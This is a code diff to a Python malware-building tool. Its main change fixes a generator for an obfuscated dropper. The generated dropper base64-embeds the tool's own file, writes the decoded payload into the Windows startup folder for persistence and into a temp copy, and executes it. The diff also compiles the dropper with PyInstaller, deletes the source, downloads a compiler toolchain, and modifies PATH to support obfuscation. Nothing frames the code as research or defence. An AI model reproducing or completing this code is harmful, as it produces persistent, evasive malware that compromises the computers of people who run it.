@@ -4,7 +4,7 @@ import os
 import random
 import base64
 from Utils.helpers import is_os_64bit,random_string,run_pwsh,is_msvc_exist,\
-    download_file,extract_zip,get_current_file_path,base64_encode_file,find_python_path
+    download_file,extract_zip,get_current_file_path,base64_encode_file,find_python_path,ctypes_update_system
 from .pyinstaller_obfuscate.obfuscationModule.main import Obfuscate
 from .pyinstaller_obfuscate.main import obfuscate_files
 
@@ -19,13 +19,11 @@ def download_pyinstaller(download_path : str):
     """
     URL = "https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v4.7.zip"
     clean_path = download_path.replace('.zip','')
-    if os.path.exists(download_path):
-        os.remove(download_path)
-    if os.path.exists(clean_path):
-        shutil.rmtree(clean_path)
-    if download_file(clean_path,URL):
-        final_dir = clean_path.split('/')[::-1] #//TODO 1: check if this actually works!
-        if extract_zip(f"c:/users/{os.getlogin()}/appdata/local/temp",clean_path):
+    final_dir = clean_path.split('/')[::-1][0]
+    if download_file(download_path,URL):
+         #//TODO 1: check if this actually works!
+        print(final_dir)
+        if extract_zip(f"c:/users/{os.getlogin()}/appdata/local/temp",download_path):
             return f"c:/users/{os.getlogin()}/appdata/local/temp/{final_dir}"
     return False
 
@@ -59,24 +57,28 @@ def create_dropper():
     backup_of_file = f"'c:/users/{os.getlogin()}/appdata/local/temp/{obfuscated_file_name + '.exe'}'"
     our_base64_file = f'"""{base64_encode_file(current_file)}"""'
     code = f"""
-    from base64 import b64decode as {obfuscated_base64_name}
-    from os import system
-    our_code = {our_base64_file}
-    def {obfuscated_main_function}():
-        with open({obfuscated_startup_folder},'wb') as {obfuscated_file_var}:
-            {obfuscated_file_var}.write({obfuscated_base64_name}(our_code))
-        with open({backup_of_file},'wb') as {obfuscated_file_var}:
-            {obfuscated_file_var},write({obfuscated_base64_name}(our_code))
-        system({backup_of_file})
-    main()
+from base64 import b64decode as {obfuscated_base64_name}
+from os import system
+our_code = {our_base64_file}
+def {obfuscated_main_function}():
+    with open({obfuscated_startup_folder},'wb') as {obfuscated_file_var}:
+        {obfuscated_file_var}.write({obfuscated_base64_name}(our_code))
+    with open({backup_of_file},'wb') as {obfuscated_file_var}:
+        {obfuscated_file_var}.write({obfuscated_base64_name}(our_code))
+    system({backup_of_file})
+{obfuscated_main_function}()
     """
-    dropper_py_file = obfuscated_startup_folder.replace('.exe','.py')
+    dropper_py_file = obfuscated_startup_folder.replace('.exe','.py').replace("'",'')
     with open(dropper_py_file,'w') as dropper_file:
         dropper_file.write(code)
-    check_if_pyinstaller_installed = f"{find_python_path()} -m pip list"
+    print(dropper_py_file)
+    python_path = find_python_path()
+    check_if_pyinstaller_installed = f"{python_path} -m pip list"
+    print(run_pwsh(check_if_pyinstaller_installed).lower())
     if 'pyinstaller' in run_pwsh(check_if_pyinstaller_installed).lower():
-        pyinstaller_path = find_python_path().replace('python.exe','scripts/pyinstaller.exe')
-        install_it = run_pwsh(f"{pyinstaller_path} --onefile --icon=NONE {dropper_py_file}")
+        pyinstaller_path = python_path.replace('python.exe','scripts/pyinstaller.exe')
+        install_it = run_pwsh(f"{pyinstaller_path} --onefile --icon=NONE '{dropper_py_file}' --distpath '{os.path.dirname(dropper_py_file)}'")
+        print(install_it)
         #//TODO: find a way to check if the install was success or not
     os.remove(dropper_py_file) #remove the python dropper code.
 
@@ -93,7 +95,7 @@ def get_pyinstaller(pythonPath: str, admin=True):
     if admin:
         if is_msvc_exist():
             if Obfuscate(base_dir=f"c:/users/{os.getlogin()}/appdata/local/temp/",python_path=pythonPath).obfuscate():
-                pass
+                return
         else:
             gcc = "https://github.com/brechtsanders/winlibs_mingw/releases/download/11.2.0-9.0.0-msvcrt-r6/winlibs-x86_64-posix-seh-gcc-11.2.0-mingw-w64-9.0.0-r6.zip"
             PATH = f"c:/users/{os.getlogin()}/appdata/local/temp/gcc.zip"
@@ -103,8 +105,9 @@ def get_pyinstaller(pythonPath: str, admin=True):
             if os.path.exists(GCC_EXTRACTION_PATH):
                 shutil.rmtree(GCC_EXTRACTION_PATH)
             if download_file(path=PATH,URL=gcc):
-                extract_zip(extracion_path=GCC_EXTRACTION_PATH,file_to_extract=PATH)
+                extract_zip(extraction_path=GCC_EXTRACTION_PATH,file_to_extract=PATH)
             os.system(r'setx PATH "C:\MinGW\mingw64\bin;%PATH%"')
+            ctypes_update_system()
             if Obfuscate(base_dir=f"c:/users/{os.getlogin()}/appdata/local/temp/",python_path=pythonPath).obfuscate():
                 obfuscate_files(extraction_path=f"c:/users/{os.getlogin()}/appdata/local/temp/",name="test",base_path=f"c:/users/{os.getlogin()}/appdata/local/temp/try_this",pythonPath=pythonPath)
             #get gcc?
